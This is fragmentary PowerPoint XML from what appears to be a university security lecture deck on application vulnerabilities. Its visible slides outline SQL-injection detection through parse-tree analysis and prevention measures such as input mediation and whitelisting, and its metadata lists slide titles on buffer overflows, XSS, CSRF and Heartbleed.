          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Query syntax analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Injected content change the parse tree of a query</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16173942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Detection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1222336"/>
            <a:ext cx="8229600" cy="1128828"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Anomaly Detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Query Syntax Analysis</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 7" descr="parsetree"/>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2819400"/>
            <a:ext cx="4191000" cy="3517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 name="Picture 8" descr="parsetre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91000" y="2513013"/>
            <a:ext cx="5105400" cy="38242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Box 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2087295" y="2450068"/>
            <a:ext cx="1547456" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Normal Profile</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="83960" y="2819400"/>
            <a:ext cx="4012581" cy="3299925"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF0000">
              <a:alpha val="1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6091458" y="2147948"/>
            <a:ext cx="1013656" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Anomaly</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="192619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FFF2B71-5672-474E-B0BA-2E11A40D4479}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:pPr/>
              <a:t>120</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20484" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Prevention</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20485" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Mediate Input</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Use pattern matching</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Hide error messages</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>READ ONLY Database Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="121790017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Prevention</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Whitelisting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Define what should be accepted</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Blacklisting (NO)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>It can never be complete</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8629502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Mobile Data Charge</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>TBA</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="147833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704</TotalTime>
  <Words>7010</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (4:3)</PresentationFormat>
  <Paragraphs>1467</Paragraphs>
  <Slides>122</Slides>
  <Notes>34</Notes>
  <HiddenSlides>13</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122</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="138" baseType="lpstr">
      <vt:lpstr>Courier</vt:lpstr>
      <vt:lpstr>굴림</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calisto MT</vt:lpstr>
      <vt:lpstr>Comic Sans MS</vt:lpstr>
      <vt:lpstr>Corbel</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Lucida Sans Typewriter</vt:lpstr>
      <vt:lpstr>Segoe UI Semibold</vt:lpstr>
      <vt:lpstr>Tahoma</vt:lpstr>
      <vt:lpstr>Times</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Trebuchet MS</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>Application Vulnerabilities</vt:lpstr>
      <vt:lpstr>A Motivating Example</vt:lpstr>
      <vt:lpstr>Two General Approaches</vt:lpstr>
      <vt:lpstr>Incomplete Mediation</vt:lpstr>
      <vt:lpstr>Timing Vulnerability</vt:lpstr>
      <vt:lpstr>Timing Vulnerability</vt:lpstr>
      <vt:lpstr>Timing Vulnerability</vt:lpstr>
      <vt:lpstr>Buffer Overflow</vt:lpstr>
      <vt:lpstr>Buffer Overflow</vt:lpstr>
      <vt:lpstr>Buffer Overflow</vt:lpstr>
      <vt:lpstr>Program V.S. Process</vt:lpstr>
      <vt:lpstr>Process Memory Organization</vt:lpstr>
      <vt:lpstr>Stack: A high-level Overview</vt:lpstr>
      <vt:lpstr>Important Registers</vt:lpstr>
      <vt:lpstr>An Example</vt:lpstr>
      <vt:lpstr>An Example</vt:lpstr>
      <vt:lpstr>An Example</vt:lpstr>
      <vt:lpstr>An Example</vt:lpstr>
      <vt:lpstr>An Example</vt:lpstr>
      <vt:lpstr>An Example</vt:lpstr>
      <vt:lpstr>An Example</vt:lpstr>
      <vt:lpstr>A BOF-Vulnerable HTTP Service</vt:lpstr>
      <vt:lpstr>Web Security</vt:lpstr>
      <vt:lpstr>Web Basics</vt:lpstr>
      <vt:lpstr>Basic Architecture</vt:lpstr>
      <vt:lpstr>Web Basics</vt:lpstr>
      <vt:lpstr>Web Basics</vt:lpstr>
      <vt:lpstr>Provide Inputs to the HTTP Server in URLs</vt:lpstr>
      <vt:lpstr>Provide Inputs to the HTTP Server in URLs</vt:lpstr>
      <vt:lpstr>HTTP Response</vt:lpstr>
      <vt:lpstr>HTML</vt:lpstr>
      <vt:lpstr>Javascript</vt:lpstr>
      <vt:lpstr>How Does a Server Generate Responses</vt:lpstr>
      <vt:lpstr>PHP</vt:lpstr>
      <vt:lpstr>PHP</vt:lpstr>
      <vt:lpstr>Server-Side Scripting</vt:lpstr>
      <vt:lpstr>Server-Side Scripting</vt:lpstr>
      <vt:lpstr>An Example</vt:lpstr>
      <vt:lpstr>SQL Injection Attack</vt:lpstr>
      <vt:lpstr>Web Application</vt:lpstr>
      <vt:lpstr>Under the Hood</vt:lpstr>
      <vt:lpstr>A Quick Review of Database</vt:lpstr>
      <vt:lpstr>A Quick Review of Database</vt:lpstr>
      <vt:lpstr>A Quick Review of Database</vt:lpstr>
      <vt:lpstr>A Web Application</vt:lpstr>
      <vt:lpstr>A Web Application</vt:lpstr>
      <vt:lpstr>A Web Application</vt:lpstr>
      <vt:lpstr>A Web Application</vt:lpstr>
      <vt:lpstr>A Web Application</vt:lpstr>
      <vt:lpstr>A Web Application</vt:lpstr>
      <vt:lpstr>A Web Application</vt:lpstr>
      <vt:lpstr>Cross-Site Scripting (XSS)</vt:lpstr>
      <vt:lpstr>Same-Origin Policy</vt:lpstr>
      <vt:lpstr>Same-Origin Policy</vt:lpstr>
      <vt:lpstr>Same-Origin Policy</vt:lpstr>
      <vt:lpstr>Same-Origin Policy</vt:lpstr>
      <vt:lpstr>JavaScript</vt:lpstr>
      <vt:lpstr>Threat</vt:lpstr>
      <vt:lpstr>HTTP Cookie</vt:lpstr>
      <vt:lpstr>Get Cookie Using Javascript</vt:lpstr>
      <vt:lpstr>Two Types of Attacks</vt:lpstr>
      <vt:lpstr>Post A Message in the Forum</vt:lpstr>
      <vt:lpstr>Persistent Attacks</vt:lpstr>
      <vt:lpstr>Persistent Attacks</vt:lpstr>
      <vt:lpstr>Real-World Examples?</vt:lpstr>
      <vt:lpstr>Samy Worm</vt:lpstr>
      <vt:lpstr>Samy Worm</vt:lpstr>
      <vt:lpstr>Non-Persistent Attacks</vt:lpstr>
      <vt:lpstr>Non-Persistent Attacks</vt:lpstr>
      <vt:lpstr>Non-Persistent Attacks</vt:lpstr>
      <vt:lpstr>CSRF</vt:lpstr>
      <vt:lpstr>CSRF</vt:lpstr>
      <vt:lpstr>CSRF</vt:lpstr>
      <vt:lpstr>Solution to Injection</vt:lpstr>
      <vt:lpstr>Dynamic Taint Analysis</vt:lpstr>
      <vt:lpstr>TaintCheck: Basic Ideas</vt:lpstr>
      <vt:lpstr>TaintSeed</vt:lpstr>
      <vt:lpstr>TaintTracker</vt:lpstr>
      <vt:lpstr>TaintTracker</vt:lpstr>
      <vt:lpstr>TaintAssert</vt:lpstr>
      <vt:lpstr>TaintAssert</vt:lpstr>
      <vt:lpstr>Implementation</vt:lpstr>
      <vt:lpstr>Instruction Set Randomization</vt:lpstr>
      <vt:lpstr>Implementation</vt:lpstr>
      <vt:lpstr>SQLrand: Preventing SQL Injection Attacks</vt:lpstr>
      <vt:lpstr>System Architecture</vt:lpstr>
      <vt:lpstr>Randomization</vt:lpstr>
      <vt:lpstr>De-randomization</vt:lpstr>
      <vt:lpstr>Parse Tree Validation</vt:lpstr>
      <vt:lpstr>The Structure of an SQL Query</vt:lpstr>
      <vt:lpstr>The Structure of an SQL Query</vt:lpstr>
      <vt:lpstr>The Structure of an SQL Query</vt:lpstr>
      <vt:lpstr>Server-Side Script Inclusion Vulnerabilities</vt:lpstr>
      <vt:lpstr>Intended Use</vt:lpstr>
      <vt:lpstr>Malicious Use (Remote-File Inclusion)</vt:lpstr>
      <vt:lpstr>Malicious Use (Local-File Inclusion)</vt:lpstr>
      <vt:lpstr>Web Security</vt:lpstr>
      <vt:lpstr>Web Security</vt:lpstr>
      <vt:lpstr>Example</vt:lpstr>
      <vt:lpstr>WordPress OptimizePress Theme – File Upload Vulnerability</vt:lpstr>
      <vt:lpstr>Discussion</vt:lpstr>
      <vt:lpstr>Resources</vt:lpstr>
      <vt:lpstr>Heartbleed</vt:lpstr>
      <vt:lpstr>Heartbleed</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Server</vt:lpstr>
      <vt:lpstr>Server</vt:lpstr>
      <vt:lpstr>Server</vt:lpstr>
      <vt:lpstr>Server</vt:lpstr>
      <vt:lpstr>Server</vt:lpstr>
      <vt:lpstr>Server</vt:lpstr>
      <vt:lpstr>Server</vt:lpstr>
      <vt:lpstr>An Example of Leaked Message</vt:lpstr>
      <vt:lpstr>Mobile Data Charging: New Attacks and Countermeasures </vt:lpstr>
      <vt:lpstr>Fail to Fail Safe</vt:lpstr>
      <vt:lpstr>Popularity -&gt; Threat</vt:lpstr>
      <vt:lpstr>Backup</vt:lpstr>
      <vt:lpstr>Detection</vt:lpstr>
      <vt:lpstr>Detection</vt:lpstr>
      <vt:lpstr>Prevention</vt:lpstr>
      <vt:lpstr>Prevention</vt:lpstr>
      <vt:lpstr>Mobile Data Charge</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Vulnerabilities</dc:title>
  <dc:creator>Junjie Zhang</dc:creator>
  <cp:lastModifiedBy>Zhang, Junjie</cp:lastModifiedBy>
  <cp:revision>775</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2014-07-22T20:51:22Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-10-03T16:07:51Z</dcterms:modified>
</cp:coreProperties>
</file>